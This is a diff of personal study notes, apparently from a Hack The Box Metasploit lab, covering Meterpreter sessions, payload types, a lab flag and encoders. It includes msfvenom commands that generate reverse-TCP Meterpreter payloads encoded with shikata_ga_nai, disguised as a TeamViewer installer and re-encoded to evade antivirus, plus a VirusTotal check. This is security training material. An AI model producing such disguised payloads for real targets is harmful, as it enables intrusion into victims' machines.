@@ -147,4 +147,61 @@ Parameter	Description
 LHOST	The host's IP address, the attacker's machine.
 LPORT	Does not require a change, just a check that the port is not already in use.
 \\MSF -Exploit and Payload Configuration
-msf> ifconfig
+msf> ifconfig set rhosts lhost then run exploit 
+meterpreter>getuid
+-the prompt is not a windows command line one but a Meterpreter prompt, the whoami typically used windows, doesnot work here. instead we can use the linux equivalent of getuid.
+\\MSF-Meterpreter commands
+$help  
+\\MSF-Meterpreter Navigation
+$cd Users  > ls >shell  <channel 1> mena conn betw atk -> target established in a reverse TCP connection using Meterpreter Stager and Stage.
+the stager was activated on our machine to await a conn request initialized by the Stage payload on the target machine
+-Moving to standard shell on the target is helpful in some cases,
+\\MSF - Window command
+Payload	Description
+generic/custom	Generic listener, multi-use
+generic/shell_bind_tcp	Generic listener, multi-use, normal shell, TCP connection binding
+generic/shell_reverse_tcp	Generic listener, multi-use, normal shell, reverse TCP connection
+windows/x64/exec	Executes an arbitrary command (Windows x64)
+windows/x64/loadlibrary	Loads an arbitrary x64 library path
+windows/x64/messagebox	Spawns a dialog via MessageBox using a customizable title, text & icon
+windows/x64/shell_reverse_tcp	Normal shell, single payload, reverse TCP connection
+windows/x64/shell/reverse_tcp	Normal shell, stager + stage, reverse TCP connection
+windows/x64/shell/bind_ipv6_tcp	Normal shell, stager + stage, IPv6 Bind TCP stager
+windows/x64/meterpreter/$	Meterpreter payload + varieties above
+windows/x64/powershell/$	Interactive PowerShell sessions + varieties above
+windows/x64/vncinject/$	VNC Server (Reflective Injection) + varieties above
+
+HTB{MSF_Expl01t4t10n}
+\\\\\\\\\\\==================================
+Encoders
+have assisted with making payloads compatible with diff processor architectures while at the same time helping with antivirus evasion.
++x64 +x86 + sparc +ppc +mips
+-they needed to remove hexadecimal opcodes known as bad characters from the payload. not only but encoding the payload in diff formats could help with the AV detection as mentioned above. 
+the use of encoders strictly for AV evasion has diminished over time. as IPS/IDS manufacturers have improved how their protection software deal with signatures in malware and various
+-Shikata Ga Nai (SGN) was one of the most utilized encoding schemas back in the day because it was very hard to detect payloads encoded through its mechanism.
+-modern detection methods have caugh up, and these encoded payloads are far from being universally undetectable anymore.
+-the name It cannot be helped or Nothing can be done about it https://cloud.google.com/blog/topics/threat-intelligence/shikata-ga-nai-encoder-still-going-strong/
+\\Selecting an Encoders
+msfpayload and msfencode in /usr/share/framework2/
+-if we wanted to create our custom payload, we could do so through msfpayload, but we would have to encode it according to the target OS architecture using msfencode afterward
+apipe would take the output from one command and feed it into the next
+$msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
+\\Generating Payload - Without encoding 
+$msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
+look at the first line $buf and see how it changes when applying an encoder like shikata_ga_nai
+\\Generating Payload - With encoding
+$msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+\\Shikata Ga Nai encoding
+https://hatching.io/blog/metasploit-payloads2/
+-want to select an Encoder for an existing payload. then use show encoder to see which encoders are available for  current exploit module + payload
+msf> show encoders
+some module need compatible encoder
+NOTE if we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today.
+$msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
+>> one better option would be to try running it through mutiple iteration of the same encoding scheme:
+ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
+ -it still not enough to evasion AV.
+-alternative  metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payload. it require free regis virustotal
+$msf-virustotal -k <API key> -f TeamViewerInstall.exe
+\\\\\\\\\\\\\\\\\\==============================
+DataBases
